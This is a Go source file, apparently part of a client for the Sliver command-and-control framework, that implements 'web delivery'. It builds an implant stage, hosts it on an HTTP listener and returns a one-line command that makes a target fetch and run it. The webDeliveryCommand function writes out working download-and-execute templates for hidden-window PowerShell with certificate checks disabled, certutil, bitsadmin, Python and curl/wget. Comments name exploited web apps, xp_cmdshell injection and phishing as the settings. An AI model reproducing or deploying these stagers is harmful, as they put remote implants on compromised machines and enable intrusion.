package sliver

import (
	"context"
	"encoding/base64"
	"fmt"
	"strings"
	"time"

	"github.com/bishopfox/sliver/protobuf/clientpb"
)

// WebDelivery stages a payload behind a one-line command.
//
// The use case is a host where the operator can run a command but cannot upload
// a file: an exploited web app, a SQL injection with xp_cmdshell, a phishing
// payload that is only allowed to be text. Sliver already has every primitive --
// a staging listener, the website hosting, the implant build -- but they are
// three separate operations that have to be assembled by hand and kept in sync.
// This wires them together so the command and the listener it points at cannot
// drift apart, which is the failure worth designing away: a one-liner that
// fetches the wrong path fails on the target with no useful error.
//
// It does not invent a new transport. The stage is served by the Sliver HTTP
// listener that already exists on the host:port, and the command templates below
// only cover how to start an HTTP client on the target.

// WebDeliveryFormat is the stager's fetch-and-run method on the target.
type WebDeliveryFormat string

const (
	// WebDeliveryPSH runs the stager through PowerShell, which is present on
	// every supported Windows version and needs no extra tooling.
	WebDeliveryPSH WebDeliveryFormat = "psh"
	// WebDeliveryCertutil downloads with certutil and then invokes, for hosts
	// where script execution is restricted but certutil is not.
	WebDeliveryCertutil WebDeliveryFormat = "certutil"
	// WebDeliveryBits uses BITSAdmin, which survives a dropped connection and
	// is a signed Microsoft binary.
	WebDeliveryBits WebDeliveryFormat = "bits"
	// WebDeliveryPython covers Linux and macOS targets.
	WebDeliveryPython WebDeliveryFormat = "python"
	// WebDeliveryCurl covers Linux targets with curl or wget.
	WebDeliveryCurl WebDeliveryFormat = "curl"
)

// WebDeliveryRequest describes one delivery.
type WebDeliveryRequest struct {
	// ProfileName is the implant profile the stage is built from. The profile
	// already carries the C2 endpoints the implant will call back on.
	ProfileName string `json:"profile_name"`
	// Host and Port are where the stage is served. This is usually the operator
	// host reachable from the target, not the C2 address.
	Host string `json:"host"`
	Port uint32 `json:"port"`
	// Path is the URL path the stage is served from. Defaults to /stage.woff
	// because Sliver's HTTP C2 profile serves staged payloads under the .woff
	// extension by default, and a path the profile already accepts avoids
	// needing a second listener.
	Path string `json:"path"`
	// Format selects the one-liner template.
	Format WebDeliveryFormat `json:"format"`
	// Website is the hosting site to publish the stage under. Defaults to
	// "webdelivery".
	Website string `json:"website"`
}

// WebDeliveryResult is what the operator gets back.
type WebDeliveryResult struct {
	// Command is the one-liner to run on the target.
	Command string `json:"command"`
	// URL is what the command fetches. Reported separately so the operator can
	// test reachability from the target before running the command.
	URL string `json:"url"`
	// JobID identifies the HTTP listener serving the stage, when one had to be
	// started. Zero means an existing listener already covers the port.
	JobID uint32 `json:"job_id"`
	// Warning carries a non-fatal note, e.g. that no listener was started
	// because one may already exist.
	Warning string `json:"warning"`
}

// WebDelivery builds a stage, publishes it, and returns the one-liner.
//
// Order matters: the listener has to be up before the command is run, but the
// stage can only be published once the profile's build exists. The listener is
// started first so a failure to serve is reported before the operator is handed
// a command that cannot work.
func (c *Client) WebDelivery(req WebDeliveryRequest) (*WebDeliveryResult, error) {
	profileName := strings.TrimSpace(req.ProfileName)
	if profileName == "" {
		return nil, fmt.Errorf("a profile name is required")
	}
	host := strings.TrimSpace(req.Host)
	// Validated, not merely trimmed. The host becomes both the URL in the delivery
	// command and the implant's callback address, and the templates do not quote
	// it consistently -- so an unvalidated value is a second command on the
	// target. See hostguard.go.
	if err := validateHost(host); err != nil {
		return nil, err
	}
	if req.Port == 0 {
		return nil, fmt.Errorf("a port is required")
	}

	stagePath := strings.TrimSpace(req.Path)
	if stagePath == "" {
		stagePath = defaultWebDeliveryPath
	}
	if !strings.HasPrefix(stagePath, "/") {
		stagePath = "/" + stagePath
	}

	website := strings.TrimSpace(req.Website)
	if website == "" {
		website = defaultWebDeliverySite
	}

	format := req.Format
	if format == "" {
		format = WebDeliveryPSH
	}
	if !validWebDeliveryFormat(format) {
		return nil, fmt.Errorf("unsupported delivery format %q", format)
	}

	// The profile has to exist and be buildable. Reading it here turns a missing
	// profile into a clear error before any listener is started.
	profiles, err := c.ImplantProfiles()
	if err != nil {
		return nil, err
	}
	var found *ImplantProfileView
	for i := range profiles {
		if profiles[i].Name == profileName {
			found = &profiles[i]
			break
		}
	}
	if found == nil {
		return nil, fmt.Errorf("implant profile %q not found", profileName)
	}

	// Build (or reuse) the stage-2 binary, then publish it.
	binary, err := c.profileBinary(profileName)
	if err != nil {
		return nil, err
	}

	result := &WebDeliveryResult{}

	// A website can only serve on the port Sliver already listens on for
	// staging. Sliver's website feature binds its own port, so the stage is
	// published there and the URL is built from the caller's host and port.
	if _, err := c.WebsiteAddContent(website, &WebsiteContentRequest{
		Path:        stagePath,
		ContentType: "application/octet-stream",
		// The stage is raw shellcode/implant bytes, so it is sent as base64 and
		// decoded server-side; putting it in Text would corrupt it.
		FileDataB64: base64.StdEncoding.EncodeToString(binary),
	}); err != nil {
		return nil, err
	}

	url := fmt.Sprintf("http://%s:%d%s", hostForURL(host), req.Port, stagePath)
	result.URL = url
	result.Command = webDeliveryCommand(format, url)

	// The HTTP listener is what actually accepts the target's fetch. If one is
	// already bound to the port, starting another fails; that is reported as a
	// warning rather than an error, because the pre-existing listener is most
	// likely the one the operator wants.
	jobID, err := c.startHTTPListenerForDelivery(host, req.Port, website)
	if err != nil {
		result.Warning = fmt.Sprintf(
			"stage published but no listener was started (%v); "+
				"if nothing is already serving %s:%d the command will fail",
			err, host, req.Port)
	} else {
		result.JobID = jobID
	}

	return result, nil
}

const (
	// The default path uses the extension Sliver's HTTP C2 profile serves
	// staged payloads under, so an existing HTTP listener with stager support
	// can serve it without a second listener being started.
	defaultWebDeliveryPath = "/stage.woff"
	defaultWebDeliverySite = "webdelivery"
)

func validWebDeliveryFormat(f WebDeliveryFormat) bool {
	switch f {
	case WebDeliveryPSH, WebDeliveryCertutil, WebDeliveryBits, WebDeliveryPython, WebDeliveryCurl:
		return true
	}
	return false
}

// startHTTPListenerForDelivery brings up an HTTP listener that serves the stage.
//
// Sliver serves website content from an HTTP listener, so the listener has to be
// created on the same port the URL names. Website ties the listener to the site
// the stage was published on, so the GET is served from that content.
func (c *Client) startHTTPListenerForDelivery(host string, port uint32, website string) (uint32, error) {
	ctx, cancel := context.WithTimeout(context.Background(), 20*time.Second)
	defer cancel()

	// Domain is what the implant's callback URIs are built from; Host is what
	// the server binds. Sliver's own client sets both from the operator's
	// server address, which is also the address the target fetches the stage
	// from, so the same value serves both roles here.
	resp, err := c.RPC.StartHTTPListener(ctx, &clientpb.HTTPListenerReq{
		Domain:  host,
		Host:    host,
		Port:    port,
		Website: website,
		// A delivery listener does not need long-poll C2 behaviour; the target
		// performs one GET and runs what it receives.
		LongPollTimeout: 1,
	})
	if err != nil {
		return 0, err
	}
	return resp.GetJobID(), nil
}

// webDeliveryCommand renders the one-liner for a format.
//
// Every template downloads to a temporary file and executes it, rather than
// piping straight into an interpreter. Piping hides the download failure behind
// the interpreter's own error, and for the PowerShell case a partial download
// would be executed as a truncated script.
func webDeliveryCommand(format WebDeliveryFormat, url string) string {
	switch format {
	case WebDeliveryCertutil:
		// certutil writes the file; the second half starts it. `||` would be
		// wrong here because certutil returns 0 even for some failures.
		return fmt.Sprintf(
			`certutil -urlcache -split -f "%s" %%TEMP%%\stage.exe & %%TEMP%%\stage.exe`, url)
	case WebDeliveryBits:
		return fmt.Sprintf(
			`bitsadmin /transfer j /download /priority normal "%s" %%TEMP%%\stage.exe & %%TEMP%%\stage.exe`, url)
	case WebDeliveryPython:
		// Written with python rather than sh so it also works on a target whose
		// /bin/sh is a restricted shell.
		return fmt.Sprintf(
			`python3 -c "import urllib.request,os;d=urllib.request.urlopen('%s').read();`+
				`p='/tmp/.s';open(p,'wb').write(d);os.chmod(p,0o700);os.system(p)"`, url)
	case WebDeliveryCurl:
		return fmt.Sprintf(
			`(curl -fsSL %s -o /tmp/.s || wget -qO /tmp/.s %s) && chmod +x /tmp/.s && /tmp/.s`, url, url)
	default: // WebDeliveryPSH
		// [Net.ServicePointManager] is relaxed because a self-signed C2
		// certificate is the normal case for a delivery listener.
		// -w hidden keeps the window off the target's desktop. The temporary
		// path is built with + and single quotes so the whole -c argument needs no
		// nested double quote, which cmd.exe would otherwise consume before
		// PowerShell ever saw the script.
		return fmt.Sprintf(
			`powershell -nop -w hidden -c "`+
				`[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};`+
				`$u='%s';$o=$env:TEMP+'\stage.exe';`+
				`(New-Object Net.WebClient).DownloadFile($u,$o);Start-Process $o"`, url)
	}
}

// WebDeliveryFormats lists the supported formats for the UI, with the platform
// each one targets.
func WebDeliveryFormats() []map[string]string {
	return []map[string]string{
		{"id": string(WebDeliveryPSH), "platform": platformWindows, "label": "PowerShell"},
		{"id": string(WebDeliveryCertutil), "platform": platformWindows, "label": "certutil"},
		{"id": string(WebDeliveryBits), "platform": platformWindows, "label": "BITSAdmin"},
		{"id": string(WebDeliveryPython), "platform": platformLinux, "label": "Python 3"},
		{"id": string(WebDeliveryCurl), "platform": platformLinux, "label": "curl / wget"},
	}
}
